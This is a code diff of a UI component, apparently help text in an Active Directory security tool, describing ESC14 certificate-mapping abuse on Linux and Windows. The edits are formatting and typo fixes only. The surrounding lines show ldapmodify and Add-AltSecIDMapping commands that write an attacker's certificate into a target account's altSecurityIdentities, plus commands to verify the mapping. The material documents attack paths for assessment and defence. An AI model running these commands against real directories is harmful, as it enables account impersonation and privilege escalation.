@@ -78,7 +78,9 @@ export const AdcsEsc14ScenarioALinux: FC = () => (
             PKI provider used in the target environment.
         </Typography>
 
-        <Typography variant='body1' className='font-medium'>Execution</Typography>
+        <Typography variant='body1' className='font-medium'>
+            Execution
+        </Typography>
 
         <Typography variant='body2'>
             Obtain a certificate meeting the above requirements for example by dumping a certificate from a computer, or
@@ -118,7 +120,7 @@ sha1 fingerprint=f61331a504cff8cb5e60c269632c31aa3032a54a`}
                 'echo -e "dn: CN=Target,CN=Users,DC=forestroot,DC=com\nchangetype: modify\nadd: altSecurityIdentities\naltSecurityIdentities: X509:<SHA1-PUKEY>f61331a504cff8cb5e60c269632c31aa3032a54a" | ldapmodify -x -D "CN=Attacker,CN=Users,DC=forestroot,DC=com" -w \'PWD\' -h forestroot.com'
             }
         </Typography>
-        <Typography variant='body2'>Verify the that the mapping was added using ldapsearch:</Typography>
+        <Typography variant='body2'>Verify that the mapping was added using ldapsearch:</Typography>
         <Typography component={'pre'}>
             {
                 'ldapsearch -x -D "CN=Attacker,CN=Users,DC=forestroot,DC=com" -w \'PWD\' -h "forestroot.com" -b "CN=Target,CN=Users,DC=forestroot,DC=com" altSecurityIdentities'
@@ -197,7 +199,9 @@ export const AdcsEsc14ScenarioAWindows: FC = () => {
                 another PKI provider used in the target environment.
             </Typography>
 
-            <Typography variant='body1' className='font-medium'>Execution</Typography>
+            <Typography variant='body1' className='font-medium'>
+                Execution
+            </Typography>
 
             <Typography variant='body2'>
                 Obtain a certificate meeting the above requirements for example by dumping a certificate from a
@@ -248,7 +252,7 @@ Cert Hash(sha1): ef9375785421d3ad286d8bdeb166f0f697266992
                     'Add-AltSecIDMapping -DistinguishedName "CN=Target,CN=Users,DC=forestroot,DC=com" -MappingString "X509:<SHA1-PUKEY>ef9375785421d3ad286d8bdeb166f0f697266992"'
                 }
             </Typography>
-            <Typography variant='body2'>Verify the that the mapping was added using Get-AltSecIDMapping:</Typography>
+            <Typography variant='body2'>Verify that the mapping was added using Get-AltSecIDMapping:</Typography>
             <Typography component={'pre'}>
                 {'Get-AltSecIDMapping -SearchBase "CN=Target,CN=Users,DC=forestroot,DC=com"'}
             </Typography>
